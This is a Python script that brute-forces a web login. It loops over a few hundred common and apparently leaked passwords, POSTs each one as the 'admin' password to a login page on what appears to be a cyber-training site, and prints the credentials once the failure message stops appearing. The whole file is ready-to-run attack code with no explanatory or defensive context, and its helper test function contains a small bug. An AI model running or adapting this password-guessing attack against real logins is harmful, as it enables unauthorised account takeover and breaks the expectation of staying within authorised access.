import requests
import time

passwords_str = "123456|password|12345678|qwerty|abc123|12345|monkey|111111|consumer|letmein|1234|dragon|trustno1|baseball|gizmodo|whatever|superman|1234567|sunshine|iloveyou|fuckyou|starwars|shadow|princess|cheese|123123|computer|gawker|football|blahblah|nintendo|0|soccer|654321|asdfasdf|master|michael|passw0rd|hello|kotaku|pepper|jennifer|666666|welcome|buster|Password|batman|1q2w3e4r|maggie|michelle|pokemon|killer|andrew|internet|biteme|orange|jordan|ginger|123|aaaaaa|tigger|charlie|chicken|nothing|fuckoff|deadspin|valleywa|qwerty12|george|swordfis|summer|asdf|matthew|asdfgh|mustang|yankees|hannah|asdfghjk|1qaz2wsx|cookie|midnight|123qwe|scooter|purple|banana|matrix|jezebel|daniel|hunter|freedom|secret|redsox|spiderma|phoenix|joshua|jessica|asshole|asdf1234|william|qwertyui|jackson|foobar|nicole|123321|peanut|samantha|mickey|booger|poop|hockey|thx1138|ashley|silver|gizmodo1|chocolat|booboo|metallic|1q2w3e|bailey|google|babygirl|thomas|simpsons|remember|gateway|oliver|monster|guitar|qazwsx|taylor|madison|anthony|justin|elizabet|1111|november|drowssap|bubbles|startrek|monkey12|diamond|coffee|butterfl|brooklyn|amanda|adidas|test|love|wordpass|sparky|morgan|merlin|maverick|elephant|Highlife|poopoo|nirvana|liverpoo|lauren|stupid|chelsea|compaq|boomer|yellow|sophie|q1w2e3r4|fucker|coolness|cocacola|blink182|zxcvbnm|snowball|snoopy|gundam|alexande|rachel|jasmine|danielle|basketba|7777777|thunder|snickers|patrick|darkness|boston|abcd1234|pumpkin|creative|88888888|smokey|sample12|godzilla|december|corvette|brandon|bandit|123abc|voodoo|turtle|spider|london|jonathan|hello123|hahaha|chicago|austin|tennis|scooby|naruto|mercedes|maxwell|fluffy|eagles|11111111|penguin|muffin|bullshit|steelers|jasper|flower|ferrari|slipknot|pookie|murphy|joseph|calvin|apples|159753|tucker|martin|11235813|whocares|pineappl|nicholas|jackass|goober|chester|8675309|222222|winston|somethin|please|dakota|112233|rosebud|dallas|696969|shithead|popcorn"

passwords = passwords_str.split("|")

url = "http://webisfun.cyber.org.il/login/login.php"

data = {"username": "admin", "password": "123456"}

def main():
	for i in passwords[::-1]:
		data["password"] = i
		resp = requests.post(url, data=data)
		if not ('Your Login Name or Password is invalid' in resp.text):
			break
		else:
			print("Failed", i, passwords.index(i))

	print(data)

def test():
	print('Your Login Name or Password is invalid' in requests.post(url, data=data))
	print()

if __name__ == "__main__":
	main()